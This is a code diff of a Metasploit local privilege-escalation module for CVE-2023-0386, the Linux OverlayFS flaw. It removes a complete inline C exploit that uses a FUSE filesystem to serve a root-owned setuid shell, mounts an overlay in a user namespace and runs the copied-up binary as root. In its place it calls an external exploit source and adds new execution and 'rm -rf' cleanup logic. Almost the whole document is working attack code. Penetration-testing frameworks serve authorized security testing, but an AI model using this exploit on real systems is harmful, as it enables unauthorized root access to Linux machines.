+++ modules/exploits/linux/local/cve_2023_0386_overlayfs_priv_esc.rb
@@ -125,13 +125,9 @@ class MetasploitModule < Msf::Exploit::Local
     mkdir(exploit_dir)
     register_dir_for_cleanup(exploit_dir)
 
-    if live_compile? && command_exists?('xxd')
+    if live_compile?
       vprint_status('Live compiling exploit on system...')
-      upload_and_compile("#{exploit_dir}/shell", exploit_source('CVE-2023-0386', 'getshell.c'))
-      cmd_exec("cd #{exploit_dir} && xxd -i shell > shell.xxd")
-      write_file("#{exploit_dir}/cve-2023-0386.c", strip_comments(get_exploit("#{exploit_dir}/.#{rand_text_alphanumeric(5..10)}")))
-      cmd_exec("gcc -o #{exploit_dir}/cve-2023-0386 #{exploit_dir}/cve-2023-0386.c -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl -pthread")
-      cmd_exec("chmod +x #{exploit_dir}/cve-2023-0386")
+      upload_and_compile("#{exploit_dir}/cve-2023-0386", exploit_source('CVE-2023-0386', 'exploit.c'), '-D_FILE_OFFSET_BITS=64 -lfuse -ldl -pthread')
     else
       vprint_status('Dropping pre-compiled exploit on system...')
       upload_and_chmodx("#{exploit_dir}/cve-2023-0386", exploit_data('CVE-2023-0386', 'cve-2023-0386'))
@@ -145,198 +141,17 @@ class MetasploitModule < Msf::Exploit::Local
 
     # Launch exploit
     print_status('Launching exploit...')
-    cmd_exec("echo '#{payload_path} & exit' | #{exploit_dir}/cve-2023-0386", nil, datastore['TIMEOUT'])
-  end
-
-  def get_exploit(exploit_dir)
-    %^
-    // Kudos to https://github.com/xkaneiki/CVE-2023-0386
-    // Just refactored and eased code to only one binary.
-
-    #define FUSE_USE_VERSION 29
-    #include <errno.h>
-    #include <fuse.h>
-    #include <stdio.h>
-    #include <string.h>
-    #include <stdlib.h>
-    #include <sched.h>
-    #include <sys/mman.h>
-    #include <sys/types.h>
-    #include <unistd.h>
-    #include <signal.h>
-
-    #include "shell.xxd"
-
-    #define DIR_BASE "#{exploit_dir}"
-    #define DIR_WORK DIR_BASE "/work"
-    #define DIR_LOWER DIR_BASE "/lower"
-    #define DIR_UPPER DIR_BASE "/upper"
-    #define DIR_MERGE DIR_BASE "/merge"
-    #define BIN_MERGE DIR_MERGE "/magic"
-    #define BIN_UPPER DIR_UPPER "/magic"
-
-
-    void fatal(const char *msg)
-    {
-        perror(msg);
-        exit(1);
-    }
-
-    static int getattr_callback(const char *path, struct stat *stbuf)
-    {
-        printf("%s\\n", "[+] getattr_callback");
-        memset(stbuf, 0, sizeof(struct stat));
-
-        if (strcmp(path, "/file") == 0)
-        {
-            printf("%s\\n", path);
-            stbuf->st_mode = S_IFREG | 04777;
-            stbuf->st_nlink = 1;
-            stbuf->st_uid = 0;
-            stbuf->st_gid = 0;
-            stbuf->st_size = sizeof(shell);
-            return 0;
-        }
-        else if (strcmp(path, "/") == 0)
-        {
-            printf("%s\\n", path);
-            stbuf->st_mode = S_IFDIR | 0777;
-            stbuf->st_nlink = 2;
-            stbuf->st_uid = 1000;
-            stbuf->st_gid = 1000;
-            return 0;
-        }
-        return -ENOENT;
-    }
-
-    static int open_callback(const char *path, struct fuse_file_info *fi)
-    {
-        printf("%s\\n", "[+] open_callback");
-        printf("%s\\n", path);
-        if (strcmp(path, "file") == 0)
-        {
-            int fd = open("", fi->flags);
-
-            return -errno;
-        }
-        return 0;
-    }
-
-    static int read_callback(const char *path,
-                             char *buf, size_t size, off_t offset,
-                             struct fuse_file_info *fi)
-    {
-        printf("%s\\n", "[+] read_callback");
-        printf("    path  : %s\\n", path);
-        printf("    size  : 0x%lx\\n", size);
-        printf("    offset: 0x%lx\\n", offset);
-        char tmp;
-        if (strcmp(path, "/file") == 0)
-        {
-            size_t len = sizeof(shell);
-            if (offset >= len)
-                return 0;
-            if ((size > len) || (offset + size > len))
-            {
-                memcpy(buf, shell + offset, len - offset);
-                return len - offset;
-            }
-            else
-            {
-                memcpy(buf, shell + offset, size);
-                return size;
-            }
-        }
-        return -ENOENT;
-    }
-
-
-    // needed for touch
-    static int ioctl_callback(const char *p, int cmd, void *arg,
-                              struct fuse_file_info *fi, unsigned int flags, void *data)
-    {
-        printf("%s\\n", "[+] ioctl callback");
-        printf("path %s\\n", p);
-        printf("cmd 0x%x\\n", cmd);
-        return 0;
-    }
-
-    static int readdir_callback(const char *path, void *buf, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi)
-    {
-        printf("%s\\n", "[+] readdir");
-        filler(buf, "file", NULL, 0);
-        return 0;
-    }
-
-    static struct fuse_operations fops = {
-        .getattr = getattr_callback,
-        .open = open_callback,
-        .read = read_callback,
-        .ioctl = ioctl_callback,
-        .readdir = readdir_callback,
-    };
-
-    void start_fuse()
-    {
-        struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
-        struct fuse_chan *chan;
-        struct fuse *fuse;
-
-        if (!(chan = fuse_mount(DIR_LOWER, &args)))
-            fatal("fuse_mount");
-
-        if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)))
-        {
-            fuse_unmount(DIR_LOWER, chan);
-            fatal("fuse_new");
-        }
-
-        fuse_set_signal_handlers(fuse_get_session(fuse));
-        fuse_loop_mt(fuse);
-        fuse_unmount(DIR_LOWER, chan);
-    }
-
-    void preps()
-    {
-        char buf[4096];
-        if (mkdir(DIR_BASE, 0777))
-            perror("mkdir");
-        sprintf(buf, "rm -rf %s/*", DIR_BASE);
-        system(buf);
-        if (mkdir(DIR_LOWER, 0777))
-            perror("mkdir");
-        if (mkdir(DIR_UPPER, 0777))
-            perror("mkdir");
-        if (mkdir(DIR_WORK, 0777))
-            perror("mkdir");
-        if (mkdir(DIR_MERGE, 0777))
-            perror("mkdir");
-    }
-
-    int main(int argc, char const *argv[])
-    {
-        char buf[8192];
-        preps();
-
-        int pid = fork();
-        if (pid == 0)
-        {
-            start_fuse();
-        }
-        else
-        {
-            printf("Waiting 1 sec...\\n");
-            sleep(1);
-            sprintf(buf, "unshare -r -m sh -c 'mount -t overlay overlay -o lowerdir=%s,upperdir=%s,workdir=%s %s && ls -la %s && touch %s/file'", DIR_LOWER, DIR_UPPER, DIR_WORK, DIR_MERGE, DIR_MERGE, DIR_MERGE);
-            printf("%s\\n", buf);
-            system(buf);
-            kill(pid, SIGINT);
-            sprintf(buf, "%s/file", DIR_UPPER);
-            printf("%s\\n", buf);
-            system(buf);
-        }
-        return 0;
-    }
-    ^
+    cmd_string = "#{exploit_dir}/cve-2023-0386 #{payload_path} #{exploit_dir}/.#{rand_text_alphanumeric(5..10)}"
+    vprint_status("Running: #{cmd_string}")
+    begin
+      output = cmd_exec(cmd_string, nil, datastore['TIMEOUT'])
+      vprint_status(output)
+    rescue Error => e
+      elog('Caught timeout.  Exploit may be taking longer or it may have failed.', error: e)
+      print_error("Exploit failed: #{e}")
+    ensure
+      # rmdir() fails here on mettle payloads, so I'm just shelling out the rm for the exploit directory.
+      cmd_exec("rm -rf '#{exploit_dir}'")
+    end
   end
 end
